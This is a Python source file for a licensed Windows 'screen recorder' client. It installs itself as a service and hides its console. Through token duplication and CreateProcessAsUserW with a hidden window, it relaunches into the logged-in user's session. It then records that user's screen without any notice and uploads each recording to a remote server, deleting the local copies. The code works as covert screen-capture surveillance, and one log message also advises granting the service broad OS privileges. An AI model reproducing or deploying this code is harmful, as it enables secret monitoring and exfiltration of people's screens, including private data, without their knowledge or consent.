"""
Screen Recorder Client
Records screen, validates license, and uploads to server
Enhanced with: multi-monitor, audio recording, pause/resume,
video compression, configurable region, and robust error handling
"""

import os
import sys
import logging
from pathlib import Path

# ============================================================================
# PATH SETUP FOR SHARED MODULE
# ============================================================================
_script_dir = os.path.dirname(os.path.abspath(__file__))
_shared_same_level = os.path.join(_script_dir, "shared")
_shared_parent_level = os.path.join(_script_dir, "..", "shared")
if os.path.isdir(_shared_same_level):
    sys.path.insert(0, _shared_same_level)
else:
    sys.path.insert(0, _shared_parent_level)

# Ensure client directory is on path for sibling imports
if _script_dir not in sys.path:
    sys.path.insert(0, _script_dir)

# ============================================================================
# MODULE IMPORTS (logging_setup must come first — installs crash handler)
# ============================================================================
from logging_setup import LOG_DIR, logger

try:
    import cv2
    import numpy as np
    import mss
    import time
    import json
    import requests
    import threading
    import queue
    from datetime import datetime, timezone
    from typing import Optional, Dict, Any, List, Tuple

    try:
        import pyaudio
        HAS_AUDIO = True
    except ImportError:
        HAS_AUDIO = False
        logger.warning("PyAudio not available, audio recording disabled")

    try:
        import socketio as socketio_client
        HAS_SOCKETIO = True
    except ImportError:
        HAS_SOCKETIO = False
        logger.warning("python-socketio not available, websocket disabled")
    logger.info("All imports successful")
except ImportError as _import_err:
    logger.error(f"Import error - missing dependency: {_import_err}")
    logger.error("Run: pip install -r requirements.txt")
    sys.exit(1)

try:
    from license_manager import LicenseManager, MachineIdentifier
    logger.info("license_manager imported successfully")
except ImportError as _lm_err:
    logger.error(f"Failed to import license_manager: {_lm_err}")
    logger.error(f"Shared path searched: {_shared_same_level}, {_shared_parent_level}")
    sys.exit(1)

from client_config import ClientState, UploadTask, Config
from retry_handler import RetryHandler, ThrottledFileReader
from offline_queue import OfflineQueue
from heartbeat import HeartbeatManager


class ScreenRecorder:
    """Main screen recorder class with enhanced features"""

    def __init__(self, config: Optional[Config] = None):
        self.config = config or Config()
        self.state = ClientState.INITIALIZING
        self.license_valid = False
        self.license_data: Optional[Dict[str, Any]] = None
        self.recording_thread: Optional[threading.Thread] = None
        self.upload_thread: Optional[threading.Thread] = None
        self.video_chunks: List[Path] = []
        self._video_chunks_lock = threading.Lock()
        self.current_video: Optional[Path] = None
        self.video_writer: Optional[cv2.VideoWriter] = None
        self.sct: Optional[mss.mss] = None
        self.license_manager = LicenseManager()
        self.machine_id = MachineIdentifier.get_machine_id()
        self.license_key: Optional[str] = None
        self._stop_event = threading.Event()
        self._pause_event = threading.Event()
        self._owner_runner: Optional["HiddenRunner"] = None

        if sys.platform == "win32":
            import signal as signal_module
            signal_module.signal(signal_module.SIGINT, self._signal_handler)
            signal_module.signal(signal_module.SIGTERM, self._signal_handler)
        else:
            import signal as signal_module
            signal_module.signal(signal_module.SIGINT, self._signal_handler)
            signal_module.signal(signal_module.SIGTERM, self._signal_handler)
            signal_module.signal(signal_module.SIGHUP, self._signal_handler)

        self.audio_stream: Optional[Any] = None
        self.audio_queue: Optional[queue.Queue] = None
        self.audio_thread: Optional[threading.Thread] = None
        self.audio_enabled = self.config.enable_audio and HAS_AUDIO
        self.socket_client: Optional[Any] = None
        self._ws_reconnect_attempts = 0
        self._ws_max_reconnect_attempts = 10
        self._ws_connected = False
        if self.config.use_websocket and HAS_SOCKETIO:
            self._connect_websocket()

        self.retry_handler = RetryHandler(
            base_delay=self.config.retry_base_delay,
            max_delay=self.config.retry_max_delay,
        )

        self.offline_queue = OfflineQueue(
            queue_dir=LOG_DIR / "offline_queue",
            max_storage_mb=self.config.max_offline_storage_mb,
        )

        self.heartbeat_manager: Optional[HeartbeatManager] = None
        self._load_public_key()

        self.video_dir = LOG_DIR / "recordings"
        self.video_dir.mkdir(parents=True, exist_ok=True)

        self.thumbnail_dir = LOG_DIR / "thumbnails"
        self.thumbnail_dir.mkdir(parents=True, exist_ok=True)

        logger.info(f"ScreenRecorder initialized. Machine ID: {self.machine_id}")

    def _connect_websocket(self) -> None:
        if not self.config.use_websocket or not HAS_SOCKETIO:
            return

        try:
            self.socket_client = socketio_client.Client(logger=False, engineio_logger=False)

            @self.socket_client.event
            def connect():
                self._ws_connected = True
                self._ws_reconnect_attempts = 0
                logger.info("[WEBSOCKET] Connected to server")

            @self.socket_client.event
            def disconnect():
                self._ws_connected = False
                logger.info("[WEBSOCKET] Disconnected from server")

            @self.socket_client.event
            def connect_error(data):
                self._ws_connected = False
                logger.warning(f"[WEBSOCKET] Connection error: {data}")

            self.socket_client.connect(self.config.websocket_url, wait_timeout=5)
            logger.info("[WEBSOCKET] Client connected")
        except Exception as ws_err:
            self._ws_connected = False
            logger.warning(f"[WEBSOCKET] Connection failed: {ws_err}")
            self.socket_client = None

    def _reconnect_websocket(self) -> bool:
        if self._ws_reconnect_attempts >= self._ws_max_reconnect_attempts:
            logger.error(f"[WEBSOCKET] Max reconnection attempts ({self._ws_max_reconnect_attempts}) reached")
            return False

        self._ws_reconnect_attempts += 1
        delay = min(2**self._ws_reconnect_attempts, 30)
        logger.info(
            f"[WEBSOCKET] Reconnecting (attempt {self._ws_reconnect_attempts}/{self._ws_max_reconnect_attempts}) in {delay}s"
        )
        time.sleep(delay)
        self._connect_websocket()
        return self._ws_connected

    def _signal_handler(self, signum, frame) -> None:
        signal_name = {2: "SIGINT", 15: "SIGTERM", 1: "SIGHUP"}.get(signum, f"Signal {signum}")
        logger.info(f"[SIGNAL] Received {signal_name}, initiating graceful shutdown...")
        self._stop_event.set()
        self._pause_event.clear()
        self.state = ClientState.STOPPED
        if self._owner_runner is not None:
            self._owner_runner.running = False
        logger.info("[SIGNAL] Graceful shutdown initiated, waiting for threads to complete...")

    def _load_public_key(self) -> None:
        search_paths = [
            LOG_DIR / "public_key.pem",
            Path(__file__).parent / "public_key.pem",
            Path("C:\\ScreenRecorderClient") / "public_key.pem",
        ]
        for key_path in search_paths:
            if key_path.exists():
                try:
                    with open(key_path, "r") as f:
                        self.license_manager.load_public_key(f.read())
                    logger.info(f"Public key loaded from: {key_path}")
                    return
                except Exception as e:
                    logger.warning(f"Failed to load public key from {key_path}: {e}")
        logger.warning(
            "Public key file not found in any search path. "
            "Searched: " + ", ".join(str(p) for p in search_paths) + ". "
            "Copy the server's public_key.pem to one of these locations."
        )

    def validate_license(self, license_key: Optional[str] = None) -> Tuple[bool, str]:
        logger.info("[LICENSE] Starting license validation...")
        if license_key is None:
            search_paths = [
                LOG_DIR / self.config.license_file,
                Path(_script_dir) / self.config.license_file,
                Path(os.environ.get("PROGRAMFILES", "C:\\Program Files")) / "ScreenRecSvc" / self.config.license_file,
            ]
            logger.debug(f"[LICENSE] Searching for license in paths: {search_paths}")
            license_path = None
            for p in search_paths:
                if p.exists():
                    license_path = p
                    logger.info(f"[LICENSE] Found license file at: {p}")
                    break
            if license_path:
                with open(license_path, "r") as f:
                    license_key = f.read().strip()
                self.license_key = license_key
                logger.info(f"[LICENSE] License file loaded from: {license_path}")
            else:
                searched = ", ".join(str(p) for p in search_paths)
                logger.error(f"[LICENSE] No license file found. Searched: {searched}")
                self.state = ClientState.LICENSE_INVALID
                return False, "No license file found"

        logger.debug(f"[LICENSE] Validating license key: {license_key[:20]}... for machine: {self.machine_id}")
        is_valid, result = self.license_manager.validate_license(license_key, self.machine_id)

        if is_valid:
            self.license_valid = True
            self.license_data = result
            self.license_key = license_key
            logger.info(f"[LICENSE] License validated successfully. Expires: {result['expires_at']}")
            return True, result
        else:
            self.license_valid = False
            self.state = ClientState.LICENSE_INVALID
            logger.error(f"[LICENSE] License validation failed: {result}")
            return False, result

    def get_screen_size(self, sct) -> Tuple[int, int]:
        monitor = sct.monitors[1]
        return monitor["width"], monitor["height"]

    def _get_video_path(self) -> Path:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        video_path = self.video_dir / f"rec_{timestamp}_{self.machine_id[:8]}.mp4"
        logger.debug(f"[PATH] Generated video path: {video_path}")
        return video_path

    def _get_capture_dimensions(self, sct) -> Tuple[int, int, int, int]:
        monitor_idx = self.config.monitor_selection
        if monitor_idx < 1 or monitor_idx >= len(sct.monitors):
            logger.warning(f"Invalid monitor selection {monitor_idx}, using primary monitor")
            monitor_idx = 1

        monitor = sct.monitors[monitor_idx]
        monitor_width = monitor["width"]
        monitor_height = monitor["height"]
        monitor_left = monitor["left"]
        monitor_top = monitor["top"]

        region_width = self.config.region_width
        region_height = self.config.region_height
        region_x = self.config.region_x
        region_y = self.config.region_y

        if region_width == 0:
            region_width = monitor_width
        if region_height == 0:
            region_height = monitor_height

        if region_x < 0:
            region_x = 0
        if region_y < 0:
            region_y = 0
        if region_x + region_width > monitor_width:
            region_x = monitor_width - region_width
        if region_y + region_height > monitor_height:
            region_y = monitor_height - region_height

        logger.info(f"[CAPTURE] Monitor {monitor_idx}: {monitor_width}x{monitor_height} at ({monitor_left},{monitor_top})")
        logger.info(f"[CAPTURE] Region: {region_width}x{region_height} at ({region_x},{region_y}) relative to monitor")

        return region_width, region_height, region_x, region_y

    def _get_monitor_region(self, sct, monitor_idx: int) -> dict:
        if monitor_idx < 1 or monitor_idx >= len(sct.monitors):
            logger.warning(f"Invalid monitor selection {monitor_idx}, using primary monitor")
            monitor_idx = 1

        monitor = sct.monitors[monitor_idx]

        region_width = self.config.region_width
        region_height = self.config.region_height
        region_x = self.config.region_x
        region_y = self.config.region_y

        if region_width == 0:
            region_width = monitor["width"]
        if region_height == 0:
            region_height = monitor["height"]

        if region_x < 0:
            region_x = 0
        if region_y < 0:
            region_y = 0
        if region_x + region_width > monitor["width"]:
            region_x = monitor["width"] - region_width
        if region_y + region_height > monitor["height"]:
            region_y = monitor["height"] - region_height

        return {
            "left": monitor["left"] + region_x,
            "top": monitor["top"] + region_y,
            "width": region_width,
            "height": region_height,
        }

    def start_recording(self) -> bool:
        logger.info("[START] Attempting to start recording...")
        if not self.license_valid:
            logger.error("[START] Cannot start recording: Invalid license")
            return False

        if self.state == ClientState.RECORDING:
            logger.warning("[START] Recording already in progress")
            return True

        import shutil
        try:
            usage = shutil.disk_usage(self.video_dir if hasattr(self, "video_dir") and self.video_dir else Path.home())
            min_free_mb = getattr(self.config, "min_disk_space_mb", 100)
            if usage.free < min_free_mb * 1024 * 1024:
                logger.error(
                    "[START] Insufficient disk space: %.1f MB free (minimum: %d MB)",
                    usage.free / (1024 * 1024),
                    min_free_mb,
                )
                return False
        except Exception as e:
            logger.warning("[START] Could not check disk space: %s", e)

        if sys.platform == "win32" and self._is_session_zero():
            logger.warning(
                "[START] Running in Windows Session 0 (service context). "
                "Screen capture will not work here. Attempting to relaunch "
                "in the active user desktop session..."
            )
            launched = self._relaunch_in_user_session()
            if launched:
                logger.info(
                    "[START] Successfully relaunched in user session. "
                    "This service-side process will now idle and keep the service alive."
                )
                self.state = ClientState.PAUSED
                return True
            else:
                logger.error(
                    "[START] Could not relaunch in user session. "
                    "The service is running as LocalSystem in Session 0 and cannot access "
                    "the interactive desktop. Screen capture is not possible from this context. "
                    "FIX: Configure the service to 'Log On As' the target user account "
                    "via Services.msc (Properties -> Log On tab), or re-run the installer "
                    "with a user account. Alternatively, grant the LocalSystem account "
                    "the 'Act as part of the operating system' (SeTcbPrivilege) privilege "
                    "via secpol.msc -> Local Policies -> User Rights Assignment."
                )
                self.state = ClientState.PAUSED
                return True

        self._stop_event.clear()
        self.state = ClientState.RECORDING
        logger.info("[START] State set to RECORDING")

        logger.info("[START] Starting recording thread...")
        self.recording_thread = threading.Thread(target=self._record_loop, daemon=True)
        self.recording_thread.start()
        logger.info("[START] Recording thread started")

        logger.info("[START] Starting upload thread...")
        self.upload_thread = threading.Thread(target=self._upload_loop, daemon=True)
        self.upload_thread.start()
        logger.info("[START] Upload thread started")

        if self.license_key:
            logger.info("[START] Starting heartbeat manager...")
            self.heartbeat_manager = HeartbeatManager(self.config, self.license_key, self.machine_id)
            self.heartbeat_manager.start()
            logger.info("[START] Heartbeat manager started")
        else:
            logger.warning("[START] No license key available, skipping heartbeat manager")

        logger.info("[START] Recording started successfully")
        return True

    def pause_recording(self) -> bool:
        if self.state != ClientState.RECORDING:
            logger.warning(f"[PAUSE] Cannot pause - current state: {self.state}")
            return False

        self._pause_event.set()
        self.state = ClientState.PAUSED
        logger.info("[PAUSE] Recording paused")

        if self.audio_stream:
            try:
                self.audio_stream.stop_stream()
                logger.info("[PAUSE] Audio stream paused")
            except Exception as e:
                logger.error(f"[PAUSE] Error pausing audio: {e}")

        return True

    def resume_recording(self) -> bool:
        if self.state != ClientState.PAUSED:
            logger.warning(f"[RESUME] Cannot resume - current state: {self.state}")
            return False

        self._pause_event.clear()
        self.state = ClientState.RECORDING
        logger.info("[RESUME] Recording resumed")

        if self.audio_stream:
            try:
                self.audio_stream.start_stream()
                logger.info("[RESUME] Audio stream resumed")
            except Exception as e:
                logger.error(f"[RESUME] Error resuming audio: {e}")

        return True

    def stop_recording(self, timeout: float = 5.0) -> None:
        logger.info("[STOP] Stopping recording...")
        self._stop_event.set()
        self._pause_event.clear()
        self.state = ClientState.STOPPED
        logger.info("[STOP] State set to STOPPED, stop event set")

        if self.recording_thread is not None and self.recording_thread.is_alive():
            logger.info(f"[STOP] Waiting for recording thread to complete (timeout: {timeout}s)...")
            self.recording_thread.join(timeout=timeout)
            if self.recording_thread.is_alive():
                logger.warning("[STOP] Recording thread did not complete within timeout")
            else:
                logger.info("[STOP] Recording thread completed")

        if self.upload_thread is not None and self.upload_thread.is_alive():
            logger.info(f"[STOP] Waiting for upload thread to complete (timeout: {timeout}s)...")
            self.upload_thread.join(timeout=timeout)
            if self.upload_thread.is_alive():
                logger.warning("[STOP] Upload thread did not complete within timeout")
            else:
                logger.info("[STOP] Upload thread completed")

        if self.video_writer is not None:
            logger.info("[STOP] Releasing video writer")
            try:
                self.video_writer.release()
            except Exception as e:
                logger.error(f"[STOP] Error releasing video writer: {e}")
            self.video_writer = None

        if self.heartbeat_manager:
            logger.info("[STOP] Stopping heartbeat manager")
            self.heartbeat_manager.stop()

        logger.info("[STOP] Recording stopped")

    @staticmethod
    def _get_current_session_id() -> int:
        try:
            import ctypes
            import ctypes.wintypes
            pid = os.getpid()
            session_id = ctypes.wintypes.DWORD(0)
            ctypes.windll.kernel32.ProcessIdToSessionId(pid, ctypes.byref(session_id))
            return session_id.value
        except Exception:
            return -1

    @staticmethod
    def _get_active_user_session_id() -> int:
        try:
            import ctypes
            session_id = ctypes.windll.kernel32.WTSGetActiveConsoleSessionId()
            return session_id
        except Exception:
            return -1

    def _is_session_zero(self) -> bool:
        sid = self._get_current_session_id()
        logger.info(f"[SESSION] Current process session ID: {sid}")
        return sid == 0

    def _relaunch_in_user_session(self) -> bool:
        try:
            import ctypes
            import ctypes.wintypes

            wtsapi32 = ctypes.windll.wtsapi32
            advapi32 = ctypes.windll.advapi32
            userenv = ctypes.windll.userenv
            kernel32 = ctypes.windll.kernel32

            active_session = self._get_active_user_session_id()
            logger.info(f"[SESSION] Active user session ID: {active_session}")
            if active_session == 0 or active_session == 0xFFFFFFFF:
                logger.warning("[SESSION] No active interactive user session found.")
                return False

            h_token = ctypes.wintypes.HANDLE()
            if not wtsapi32.WTSQueryUserToken(active_session, ctypes.byref(h_token)):
                err = kernel32.GetLastError()
                logger.error(f"[SESSION] WTSQueryUserToken failed (error {err}).")
                return False

            h_dup_token = ctypes.wintypes.HANDLE()
            TOKEN_ALL_ACCESS = 0xF01FF
            if not advapi32.DuplicateTokenEx(
                h_token, TOKEN_ALL_ACCESS, None, 2, 1, ctypes.byref(h_dup_token),
            ):
                err = kernel32.GetLastError()
                logger.error(f"[SESSION] DuplicateTokenEx failed (error {err})")
                kernel32.CloseHandle(h_token)
                return False

            env_block = ctypes.c_void_p()
            if not userenv.CreateEnvironmentBlock(ctypes.byref(env_block), h_dup_token, False):
                logger.warning("[SESSION] CreateEnvironmentBlock failed, using inherited env")
                env_block = None

            python_exe = sys.executable
            script_path = os.path.abspath(__file__)
            cmd = f'"{python_exe}" "{script_path}"'
            logger.info(f"[SESSION] Relaunching in user session with command: {cmd}")

            class STARTUPINFO(ctypes.Structure):
                _fields_ = [
                    ("cb", ctypes.wintypes.DWORD),
                    ("lpReserved", ctypes.wintypes.LPWSTR),
                    ("lpDesktop", ctypes.wintypes.LPWSTR),
                    ("lpTitle", ctypes.wintypes.LPWSTR),
                    ("dwX", ctypes.wintypes.DWORD),
                    ("dwY", ctypes.wintypes.DWORD),
                    ("dwXSize", ctypes.wintypes.DWORD),
                    ("dwYSize", ctypes.wintypes.DWORD),
                    ("dwXCountChars", ctypes.wintypes.DWORD),
                    ("dwYCountChars", ctypes.wintypes.DWORD),
                    ("dwFillAttribute", ctypes.wintypes.DWORD),
                    ("dwFlags", ctypes.wintypes.DWORD),
                    ("wShowWindow", ctypes.wintypes.WORD),
                    ("cbReserved2", ctypes.wintypes.WORD),
                    ("lpReserved2", ctypes.c_void_p),
                    ("hStdInput", ctypes.wintypes.HANDLE),
                    ("hStdOutput", ctypes.wintypes.HANDLE),
                    ("hStdError", ctypes.wintypes.HANDLE),
                ]

            class PROCESS_INFORMATION(ctypes.Structure):
                _fields_ = [
                    ("hProcess", ctypes.wintypes.HANDLE),
                    ("hThread", ctypes.wintypes.HANDLE),
                    ("dwProcessId", ctypes.wintypes.DWORD),
                    ("dwThreadId", ctypes.wintypes.DWORD),
                ]

            si = STARTUPINFO()
            si.cb = ctypes.sizeof(si)
            si.lpDesktop = "winsta0\\default"
            si.dwFlags = 0x00000001  # STARTF_USESHOWWINDOW
            si.wShowWindow = 0  # SW_HIDE

            pi = PROCESS_INFORMATION()

            CREATION_FLAGS = 0x00000010 | 0x00000400  # CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT

            result = advapi32.CreateProcessAsUserW(
                h_dup_token, None, cmd, None, None, False,
                CREATION_FLAGS, env_block, str(Path(__file__).parent),
                ctypes.byref(si), ctypes.byref(pi),
            )

            if env_block:
                userenv.DestroyEnvironmentBlock(env_block)
            kernel32.CloseHandle(h_token)
            kernel32.CloseHandle(h_dup_token)

            if result:
                logger.info(f"[SESSION] Successfully launched recorder in user session (PID: {pi.dwProcessId})")
                kernel32.CloseHandle(pi.hProcess)
                kernel32.CloseHandle(pi.hThread)
                return True
            else:
                err = kernel32.GetLastError()
                logger.error(f"[SESSION] CreateProcessAsUserW failed (error {err})")
                return False

        except Exception as exc:
            logger.error(f"[SESSION] Failed to relaunch in user session: {exc}", exc_info=True)
            return False

    def _record_loop(self) -> None:
        sct = mss.mss()

        logger.info(f"[RECORD] Number of monitors detected: {len(sct.monitors)}")
        for i, monitor in enumerate(sct.monitors):
            logger.info(f"[RECORD] Monitor {i}: {monitor}")

        fps = self.config.recording_fps
        chunk_duration = self.config.chunk_duration

        monitor_idx = self.config.monitor_selection
        if monitor_idx < 1 or monitor_idx >= len(sct.monitors):
            logger.warning(f"[RECORD] Invalid monitor {monitor_idx}, using primary")
            monitor_idx = 1

        capture_region = self._get_monitor_region(sct, monitor_idx)
        width = capture_region["width"]
        height = capture_region["height"]

        logger.info(f"[RECORD] Capture region: {width}x{height} at ({capture_region['left']}, {capture_region['top']})")

        fourcc = cv2.VideoWriter_fourcc(*"mp4v")

        chunk_start_time = time.time()
        video_path = self._get_video_path()
        self.video_writer = cv2.VideoWriter(str(video_path), fourcc, fps, (width, height))

        if not self.video_writer.isOpened():
            logger.error(f"[RECORD] Failed to open video writer for {video_path}")
            self.state = ClientState.ERROR
            return

        logger.info(f"[RECORD] Started new video chunk: {video_path.name} (resolution: {width}x{height}, fps: {fps})")

        frames_captured = 0
        consecutive_black_frames = 0
        max_black_frames_before_warning = 30
        paused_time = 0.0

        while not self._stop_event.is_set():
            if self._pause_event.is_set():
                if self.state == ClientState.RECORDING:
                    self.state = ClientState.PAUSED
                    logger.info("[RECORD] Recording paused, waiting...")

                time.sleep(0.1)
                paused_time += 0.1
                continue
            elif self.state == ClientState.PAUSED:
                self.state = ClientState.RECORDING
                logger.info(f"[RECORD] Recording resumed after {paused_time:.1f}s pause")

            try:
                screenshot = sct.grab(capture_region)
                frame = np.array(screenshot)

                if frame.size == 0:
                    logger.warning("[RECORD] Captured empty frame")
                    time.sleep(1.0 / fps)
                    continue

                if frames_captured == 0:
                    logger.info(f"[RECORD] Frame properties: shape={frame.shape}, dtype={frame.dtype}")
                    if frame.shape[0] > 10 and frame.shape[1] > 10:
                        sample = frame[5:10, 5:10]
                        logger.info(f"[RECORD] Sample pixel values (BGRA): {sample.flatten()[:12]}")

                if frames_captured < 100:
                    mean_val = np.mean(frame)
                    if mean_val < 5:
                        consecutive_black_frames += 1
                        if consecutive_black_frames == max_black_frames_before_warning:
                            logger.warning(
                                f"[RECORD] Detected {consecutive_black_frames} consecutive dark frames "
                                f"(mean pixel value: {mean_val:.2f}). This may indicate a screen capture issue."
                            )
                            for test_monitor_idx in range(1, min(len(sct.monitors), 5)):
                                try:
                                    test_shot = sct.grab(sct.monitors[test_monitor_idx])
                                    test_frame = np.array(test_shot)
                                    if test_frame.size > 0:
                                        test_mean = np.mean(test_frame)
                                        logger.info(f"[RECORD] Monitor {test_monitor_idx} mean pixel value: {test_mean:.2f}")
                                except Exception as monitor_err:
                                    logger.debug(f"[RECORD] Error testing monitor {test_monitor_idx}: {monitor_err}")
                    else:
                        consecutive_black_frames = 0

                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)

                if self.video_writer is not None:
                    self.video_writer.write(frame)
                    frames_captured += 1

                if time.time() - chunk_start_time >= chunk_duration:
                    if self.video_writer is not None:
                        self.video_writer.release()
                        logger.info(f"[RECORD] Released video writer for chunk: {video_path.name}")

                    with self._video_chunks_lock:
                        self.video_chunks.append(video_path)
                    logger.info(f"[RECORD] Video chunk completed: {video_path.name} (frames: {frames_captured})")

                    chunk_start_time = time.time()
                    video_path = self._get_video_path()
                    self.video_writer = cv2.VideoWriter(str(video_path), fourcc, fps, (width, height))
                    if not self.video_writer.isOpened():
                        logger.error(f"[RECORD] Failed to open video writer for {video_path}")
                        return
                    logger.info(f"[RECORD] Started new video chunk: {video_path.name}")
                    frames_captured = 0
                    consecutive_black_frames = 0

                time.sleep(1.0 / fps)
            except Exception as e:
                logger.error(f"[RECORD] Recording error: {e}", exc_info=True)
                time.sleep(1)

    def _upload_loop(self) -> None:
        logger.info("[UPLOAD] Upload loop started")
        while not self._stop_event.is_set():
            try:
                queue_count = self.offline_queue.count()
                if queue_count > 0:
                    logger.info(f"[UPLOAD] Processing {queue_count} items in offline queue")

                while not self.offline_queue.is_empty():
                    task = self.offline_queue.get_next()
                    if task is None:
                        break

                    logger.info(f"[UPLOAD] Attempting upload of queued video: {task.video_path.name}")
                    success = self._upload_video_with_retry(task)
                    if success:
                        self.offline_queue.remove(task)
                        if task.video_path.exists():
                            file_size = task.video_path.stat().st_size
                            task.video_path.unlink()
                            logger.info(
                                f"[UPLOAD] Successfully uploaded and deleted queued video: "
                                f"{task.video_path.name} ({file_size} bytes)"
                            )
                        else:
                            logger.warning(f"[UPLOAD] Queued video already deleted: {task.video_path.name}")
                    else:
                        logger.warning(f"[UPLOAD] Failed to upload queued video (will retry later): {task.video_path.name}")
                        break

                with self._video_chunks_lock:
                    chunks_to_process = list(self.video_chunks)

                chunks_count = len(chunks_to_process)
                if chunks_count > 0:
                    logger.info(f"[UPLOAD] Found {chunks_count} completed chunks ready for upload")

                    for video_path in chunks_to_process:
                        if video_path.exists():
                            file_size = video_path.stat().st_size
                            logger.info(f"[UPLOAD] Attempting upload of completed chunk: {video_path.name} ({file_size} bytes)")
                            task = UploadTask(
                                video_path=video_path,
                                timestamp=datetime.now(timezone.utc),
                            )
                            success = self._upload_video_with_retry(task)
                            if success:
                                with self._video_chunks_lock:
                                    if video_path in self.video_chunks:
                                        self.video_chunks.remove(video_path)
                                try:
                                    video_path.unlink()
                                    logger.info(f"[UPLOAD] Successfully uploaded and deleted chunk: {video_path.name}")
                                except OSError as e:
                                    logger.error(f"[UPLOAD] Failed to delete uploaded chunk {video_path.name}: {e}")
                            else:
                                logger.warning(f"[UPLOAD] Upload failed, moving to offline queue: {video_path.name}")
                                self.offline_queue.add(video_path)
                                with self._video_chunks_lock:
                                    if video_path in self.video_chunks:
                                        self.video_chunks.remove(video_path)
                        else:
                            logger.warning(f"[UPLOAD] Chunk file missing, removing from tracking: {video_path.name}")
                            with self._video_chunks_lock:
                                if video_path in self.video_chunks:
                                    self.video_chunks.remove(video_path)

                logger.debug(f"[UPLOAD] Upload loop sleeping for {self.config.upload_interval} seconds")
                self._stop_event.wait(self.config.upload_interval)

            except Exception as e:
                logger.error(f"[UPLOAD] Upload error: {e}", exc_info=True)
                time.sleep(60)

    def _upload_video_with_retry(self, task: UploadTask) -> bool:
        if not task.video_path.exists():
            logger.warning(f"[UPLOAD] Video file not found: {task.video_path.name}")
            return True

        file_size = task.video_path.stat().st_size
        logger.info(f"[UPLOAD] Starting upload attempt for: {task.video_path.name} ({file_size} bytes)")
        url = f"{self.config.server_url}/api/v1/upload"

        for attempt in range(task.retry_count, self.retry_handler.max_retries):
            try:
                with open(task.video_path, "rb") as f:
                    upload_file = (
                        ThrottledFileReader(f, self.config.upload_speed_limit_kbps)
                        if self.config.upload_speed_limit_kbps > 0
                        else f
                    )
                    files = {"video": (task.video_path.name, upload_file, "video/mp4")}
                    headers = {
                        "X-License-Key": self.license_key or "",
                        "X-Machine-ID": self.machine_id,
                    }
                    data = {
                        "machine_id": self.machine_id,
                        "timestamp": task.timestamp.isoformat(),
                    }

                    logger.debug(f"[UPLOAD] Attempt {attempt + 1}/{self.retry_handler.max_retries} for {task.video_path.name}")
                    response = requests.post(url, files=files, data=data, headers=headers, timeout=60)

                    if response.status_code == 200:
                        logger.info(f"[UPLOAD] SUCCESS: Video uploaded successfully: {task.video_path.name}")
                        return True
                    elif 500 <= response.status_code < 600:
                        logger.warning(f"[UPLOAD] Server error {response.status_code} for {task.video_path.name}, will retry")
                        raise requests.exceptions.HTTPError(response=response)
                    else:
                        logger.error(
                            f"[UPLOAD] Upload failed (client error) for {task.video_path.name}: "
                            f"HTTP {response.status_code} - {response.text[:200]}"
                        )
                        return False

            except requests.exceptions.RequestException as e:
                task.retry_count = attempt + 1
                task.last_error = str(e)
                logger.warning(f"[UPLOAD] Network error on attempt {attempt + 1} for {task.video_path.name}: {e}")

                if self.retry_handler.should_retry(attempt + 1, e):
                    delay = self.retry_handler.get_delay(attempt + 1)
                    logger.warning(f"[UPLOAD] Upload failed, retrying in {delay:.1f}s: {e}")
                    time.sleep(delay)
                else:
                    logger.error(f"[UPLOAD] Upload failed after {attempt + 1} attempts for {task.video_path.name}: {e}")
                    return False

        logger.error(f"[UPLOAD] Giving up on {task.video_path.name} after {self.retry_handler.max_retries} attempts")
        return False


class HiddenRunner:
    """Manages hidden execution of the screen recorder"""

    def __init__(self):
        self.recorder: Optional[ScreenRecorder] = None
        self.running = False

    def start(self) -> bool:
        logger.info("[HIDDEN_RUNNER] Starting hidden screen recorder service")
        try:
            self._hide_console()

            logger.info("[HIDDEN_RUNNER] Creating ScreenRecorder instance")
            self.recorder = ScreenRecorder()
            self.recorder._owner_runner = self

            logger.info("[HIDDEN_RUNNER] Validating license...")
            valid, result = self.recorder.validate_license()
            if not valid:
                logger.error(f"[HIDDEN_RUNNER] License validation failed: {result}")
                return False
            logger.info("[HIDDEN_RUNNER] License validation successful")

            logger.info("[HIDDEN_RUNNER] Starting recording...")
            if self.recorder.start_recording():
                self.running = True
                logger.info("[HIDDEN_RUNNER] Screen recorder service started successfully")
                return True
            else:
                logger.error("[HIDDEN_RUNNER] Failed to start recording")
                return False

        except Exception as e:
            logger.error(f"[HIDDEN_RUNNER] Failed to start hidden runner: {e}", exc_info=True)
            return False

    def stop(self) -> None:
        logger.info("[RUNNER] Stopping screen recorder service...")
        self.running = False
        if self.recorder:
            self.recorder.stop_recording(timeout=10.0)
        logger.info("[RUNNER] Screen recorder service stopped")

    def _hide_console(self) -> None:
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except (ImportError, AttributeError, OSError):
            pass

    def run_forever(self) -> None:
        if self.start():
            try:
                while self.running:
                    for _ in range(10):
                        time.sleep(0.1)
                        if not self.running:
                            break
            except KeyboardInterrupt:
                logger.info("[RUNNER] Keyboard interrupt received, stopping...")
            except SystemExit:
                logger.info("[RUNNER] System exit received, stopping...")
            except Exception as e:
                logger.error(f"[RUNNER] Unexpected error in main loop: {e}", exc_info=True)
            finally:
                self.stop()


def install_as_service() -> None:
    try:
        import win32service
        import win32serviceutil
        import win32event
        import servicemanager

        class ScreenRecorderService(win32serviceutil.ServiceFramework):
            _svc_name_ = "ScreenRecSvc"
            _svc_display_name_ = "Screen Recording Service"
            _svc_description_ = "Automatic screen recording service"

            def __init__(self, args):
                win32serviceutil.ServiceFramework.__init__(self, args)
                self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
                self.runner = None

            def SvcStop(self):
                self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
                if self.runner:
                    self.runner.stop()
                win32event.SetEvent(self.hWaitStop)

            def SvcDoRun(self):
                self.runner = HiddenRunner()
                self.runner.start()
                win32event.WaitForSingleObject(self.hWaitStop, win32event.INFINITE)

        win32serviceutil.HandleCommandLine(ScreenRecorderService)

    except ImportError:
        logger.warning("pywin32 not available, running as regular process")
        runner = HiddenRunner()
        runner.run_forever()


if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] in ("install", "--install"):
            sys.argv[1] = "install"
            install_as_service()
        elif sys.argv[1] in ("remove", "--uninstall"):
            sys.argv[1] = "remove"
            install_as_service()
        elif sys.argv[1] in ("--get-id", "-g"):
            print(f"Your Machine ID: {MachineIdentifier.get_machine_id()}")
